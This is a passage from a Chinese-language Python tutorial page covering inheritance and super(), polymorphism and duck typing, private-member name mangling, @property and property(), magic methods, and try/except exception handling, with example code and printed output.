class="line">s.speak()</span><br></pre></td></tr></table></figure><blockquote><p>Python3的继承机制不同于Python2。其核心原则是下面两条，请谨记！<br>子类在调用某个方法或变量的时候，首先在自己内部查找，如果没有找到，则开始根据继承机制在父类里查找。<br>根据父类定义中的顺序，以深度优先的方式逐一查找父类！</p></blockquote><p><strong>super()函数</strong><br>我们都知道，在子类中如果有与父类同名的成员，那就会覆盖掉父类里的成员。那如果你想强制调用父类的成员呢？使用super()函数！这是一个非常重要的函数，最常见的就是通过super调用父类的实例化方法<code>__init__</code>！</p><p>语法：<code>super(子类名, self).方法名()</code>，需要传入的是子类名和self，调用的是父类里的方法，按父类的方法需要传入参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类的__init__方法被执行了！&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类的show方法被执行了！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">super</span>(B, self).__init__(name=name)</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(B, self).show()</span><br><span class="line"></span><br><span class="line">obj = B(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.show()</span><br></pre></td></tr></table></figure><p><strong>多态</strong><br>先举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am animal&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a dog&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a cat&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pig</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a pig&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个函数接收一个animal参数，并调用它的kind方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_kind</span>(<span class="params">animal</span>):</span><br><span class="line">    animal.kind()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = Dog()</span><br><span class="line">c = Cat()</span><br><span class="line">p = Pig()</span><br><span class="line"></span><br><span class="line">show_kind(d)</span><br><span class="line">show_kind(c)</span><br><span class="line">show_kind(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------</span></span><br><span class="line"><span class="comment"># 打印结果：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i am a dog</span></span><br><span class="line"><span class="comment"># i am a cat</span></span><br><span class="line"><span class="comment"># i am a pig</span></span><br></pre></td></tr></table></figure><p>看上去与其他面向对象语言的多态没有区别，实际上，由于Python的动态语言特性，传递给函数show_kind()的参数animal可以是 任何的类型，只要它有一个kind()的方法即可。动态语言调用实例方法时不检查类型，只要方法存在，参数正确，就可以调用。这就是动态语言的“鸭子类型”，它并不要求严格的继承体系，一个对象只要“看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Job</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am not animal, i am a job&quot;</span>)</span><br><span class="line"></span><br><span class="line">j = Job()</span><br><span class="line">show_kind(j)</span><br></pre></td></tr></table></figure><p>可能有人会觉得，这些内容很自然啊，没什么不好理解，不觉得多态有什么特殊，Python就是这样啊！</p><p>如果你学过JAVA这一类强类型静态语言，就不会这么觉得了，对于JAVA，必须指定函数参数的数据类型，只能传递对应参数类型或其子类型的参数，不能传递其它类型的参数，show_kind()函数只能接收animal、dog、cat和pig类型，而不能接收job类型。就算接收dog、cat和pig类型，也是通过面向对象的多态机制实现的。</p><p><strong>成员保护和访问限制</strong><br>在类似JAVA的语言中，有private关键字，可以将某些变量和方法设为私有，阻止外部访问。但是，Python没有这个机制，Python利用变量和方法名字的变化，实现这一功能。<br>在Python中，如果要让内部成员不被外部访问，可以在成员的名字前<strong>加上两个下划线__，这个成员就变成了一个私有成员（private）。私有成员只能在类的内部访问，外部无法访问。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line">    title = <span class="string">&quot;人类&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.__name, self.__age))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">self, age</span>):</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.get_name()</span><br><span class="line">obj.set_name(<span class="string">&quot;tom&quot;</span>)</span><br></pre></td></tr></table></figure><p>python的有趣特性<br>以双下划线开头的数据成员是不是一定就无法从外部访问呢？其实也不是！本质上，从内部机制原理讲，外部不能直接访问<code>__age</code>是因为Python解释器对外把<code>__age</code>变量改成了<code>_People__age</code>，也就是<code>_类名__age</code>（类名前是一个下划线）。因此，投机取巧的话，你可以通过<code>_ People__age</code>在类的外部访问<code>__age</code>变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj._People__name)</span><br></pre></td></tr></table></figure><p>由于Python内部会对双下划线开头的私有成员进行名字变更，所以会出现下面的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line">    title = <span class="string">&quot;人类&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.__name, self.__age))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.__name = <span class="string">&quot;tom&quot;</span>          <span class="comment"># 注意这一行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.__name:  &quot;</span>, obj.__name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.get_name():  &quot;</span>, obj.get_name())</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------</span></span><br><span class="line"><span class="comment"># 打印结果：</span></span><br><span class="line"><span class="comment"># obj.__name:   tom</span></span><br><span class="line"><span class="comment"># obj.get_name():   jack</span></span><br></pre></td></tr></table></figure><p>此时的<code>obj.__name= 'tom'</code>，相当于给obj实例添加了一个新的实例变量<code>__name</code>,而不是对原有私有成员<code>__name</code>的重新赋值。</p><p>此外，有些时候，你会看到以一个下划线开头的成员名，比如<code>_name</code>，这样的数据成员在外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的标识符时，意思就是，“虽然我可以被外部访问，但是，请把我视为私有成员，不要在外部访问我！”。</p><p>还有，在Python中，标识符类似<code>__xxx__</code>的，也就是以双下划线开头，并且以双下划线结尾的，是特殊成员，特殊成员不是私有成员，可以直接访问，要注意区别对待。同时请尽量不要给自定义的成员命名<code>__name__</code>或<code>__iter__</code>这样的标识，它们都是Python中具有特殊意义的魔法方法名。</p><p>类的成员与下划线总结：<br><code>_name、_name_、_name__</code>:建议性的私有成员，不要在外部访问。<br><code>__name、 __name_ </code>:强制的私有成员，但是你依然可以蛮横地在外部危险访问。<br><code>__name__</code>:特殊成员，与私有性质无关，例如<code>__doc__</code>。<br><code>name_、name__</code>:没有任何特殊性，普通的标识符，但最好不要这么起名。</p><p><strong>伪装类方法</strong></p><ol><li>@property装饰器——更多有关<a href="https://www.liujiangblog.com/course/python/39">装饰器</a>的知识</li></ol><p>Python内置的<code>@property</code>装饰器可以把类的方法伪装成属性调用的方式。也就是本来是<code>Foo.func()</code>的调用方法，变成<code>Foo.func</code>的方式。在很多场合下，这是一种非常有用的机制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(age, <span class="built_in">int</span>):</span><br><span class="line">            self.__age = age</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.deleter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;删除年龄数据！&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.age)</span><br><span class="line">obj.age = <span class="number">19</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.age:  &quot;</span>, obj.age)</span><br><span class="line"><span class="keyword">del</span> obj.age</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">打印结果：</span><br><span class="line"><span class="number">18</span></span><br><span class="line">obj.age:   <span class="number">19</span></span><br><span class="line">删除年龄数据！</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">a = obj.age    <span class="comment"># 获取值</span></span><br><span class="line">obj.age = <span class="number">19</span>    <span class="comment"># 重新赋值</span></span><br><span class="line"><span class="keyword">del</span> obj.age     <span class="comment"># 删除属性</span></span><br></pre></td></tr></table></figure><p>将一个方法伪装成为属性后，就不再使用圆括号的调用方式了。而是类似变量的赋值、获取和删除方法了。当然，每个动作内部的代码细节还是需要你自己根据需求去实现的。</p><p>那么如何将一个普通的方法转换为一个“伪装”的属性呢？</p><ul><li>首先，在普通方法的基础上添加<code>@property</code>装饰器，例如上面的age()方法。这相当于一个get方法，用于获取值,决定类似<code>&quot;result = obj.age&quot;</code>执行什么代码。该方法仅有一个self参数。</li><li>写一个同名的方法，添加<code>@xxx.setter</code>装饰器（xxx表示和上面方法一样的名字），比如例子中的第二个方法。这相当于编写了一个set方法，提供赋值功能，决定类似<code>&quot;obj.age = ....&quot;</code>的语句执行什么代码。</li><li>再写一个同名的方法，并添加<code>@xxx.delete</code>装饰器，比如例子中的第三个方法。用于删除功能，决定<code>&quot;del obj.age &quot;</code>这样的语句具体执行什么代码。</li></ul><p>简而言之，就是分别将三个方法定义为对同一个属性的获取、修改和删除。还可以定义只读属性，也就是只定义getter方法，不定义setter方法就是一个只读属性。</p><h3 id="property-函数">property()函数</h3><p>除了使用装饰器的方式将一个方法伪装成属性外，Python内置的builtins模块中的property()函数，为我们提供了第二种设置类属性的手段。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(age, <span class="built_in">int</span>):</span><br><span class="line">            self.__age = age</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;删除年龄数据！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 核心在这句</span></span><br><span class="line">    age = <span class="built_in">property</span>(get_age, set_age, del_age, <span class="string">&quot;年龄&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.age)</span><br><span class="line">obj.age = <span class="number">19</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.age:  &quot;</span>, obj.age)</span><br><span class="line"><span class="keyword">del</span> obj.age</span><br></pre></td></tr></table></figure><p>通过语句<code>age = property(get_age, set_age, del_age, &quot;年龄&quot;)</code>将一个方法伪装成为属性。其效果和装饰器的方法是一样的。</p><p>property()函数的参数：</p><ul><li>第一个参数是方法名，调用 <code>实例.属性</code> 时自动执行的方法</li><li>第二个参数是方法名，调用 <code>实例.属性 ＝ XXX</code>时自动执行的方法</li><li>第三个参数是方法名，调用 <code>del 实例.属性</code> 时自动执行的方法</li><li>第四个参数是字符串，调用 <code>实例.属性.__doc__</code>时的描述信息。</li></ul><p><strong>特殊成员和魔法方法</strong><br>Python中有大量类似__doc__这种以双下划线开头和结尾的特殊成员及“魔法方法”，它们有着非常重要的地位和作用，也是Python语言独具特色的语法之一！</p><p>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__init__ :      构造函数，在生成对象时调用</span><br><span class="line">__del__ :       析构函数，释放对象时使用</span><br><span class="line">__repr__ :      打印，转换</span><br><span class="line">__setitem__ :   按照索引赋值</span><br><span class="line">__getitem__:    按照索引获取值</span><br><span class="line">__len__:        获得长度</span><br><span class="line">__cmp__:        比较运算</span><br><span class="line">__call__:       调用</span><br><span class="line">__add__:        加运算</span><br><span class="line">__sub__:        减运算</span><br><span class="line">__mul__:        乘运算</span><br><span class="line">__div__:        除运算</span><br><span class="line">__mod__:        求余运算</span><br><span class="line">__pow__:        幂</span><br></pre></td></tr></table></figure><p>需要注意的是，这些成员里面有些是方法，调用时要加括号，有些是属性，调用时不需要加括号（废话！）。<br>具体用法请查看<a href="https://www.liujiangblog.com/course/python/47">python教程</a></p><h3 id="异常处理">异常处理</h3><p>在程序运行过程中，总会遇到各种各样的问题和错误。有些错误是我们编写代码时自己造成的，比如语法错误、调用错误，甚至逻辑错误。还有一些错误，则是不可预料的错误，但是完全有可能发生的，比如文件不存在、磁盘空间不足、网络堵塞、系统错误等等。这些导致程序在运行过程中出现异常中断和退出的错误，我们统称为异常。大多数的异常都不会被程序处理，而是以错误信息的形式展现出来。</p><p>异常有很多种类型，Python内置了几十种常见的异常，就在builtins模块内，无需特别导入，直接就可使用。需要注意的是，所有的异常都是异常类，首字母是大写的！</p><p>在发生异常的时候，Python会打印出异常信息，信息的前面部分显示了异常发生的上下文环境，并以调用栈的形式显示具体信息。异常类型作为信息的一部分也会被打印出来，例如ZeroDivisionError，NameError 和 TypeError。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> * (<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">ZeroDivisionError: division by zero</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span> + spam*<span class="number">3</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">NameError: name <span class="string">&#x27;spam&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;2&#x27;</span> + <span class="number">2</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> ?</span><br><span class="line">TypeError: Can<span class="string">&#x27;t convert &#x27;</span><span class="built_in">int</span><span class="string">&#x27; object to str implicitly</span></span><br></pre></td></tr></table></figure><p>为了保证程序的正常运行，提高程序健壮性和可用性。我们应当尽量考虑全面，将可能出现的异常进行处理，而不是留在那里，任由其发生。</p><p>Python内置了一套try…except…finally（else）…的异常处理机制，来帮助我们进行异常处理。其基本语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    pass</span><br><span class="line">except Exception as ex:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><em>注：在Python3中，原Python2的<code>except Exception , ex</code>的别名方法已经不能使用，逗号被认为是两种异常的分隔符，而不是取别名。</em></p><p>Python的异常机制具有嵌套处理的能力，比如下面的函数f3()调用f2()，f2()调用f1()，虽然是在f1()出错了，但只需要在f3()进行异常捕获，不需要每一层都捕获异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>():</span><br><span class="line">    f1()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>():</span><br><span class="line">    f2()</span><br><span class="line"></span><br><span class="line">f3()</span><br><span class="line">------------------------</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    f3()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> f3</span><br><span class="line">    f2()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> f2</span><br><span class="line">    f1()</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">2</span>, <span class="keyword">in</span> f1</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><p>仅仅需要在调用f3()函数的时候捕获异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>/<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>():</span><br><span class="line">    f1()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>():</span><br><span class="line">    f2()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f3()</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p><strong><code>try…except…</code>语句处理异常的工作机制如下：</strong></p><ul><li>首先，执行try子句（在关键字try和关键字except之间的语句）</li><li>如果没有异常发生，忽略except子句，try子句执行后结束。</li><li>如果在执行try子句的过程中发生了异常，那么try子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的except子句将被执行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line">结果：</span><br><span class="line">发生异常之前的语句正常执行</span><br><span class="line">division by 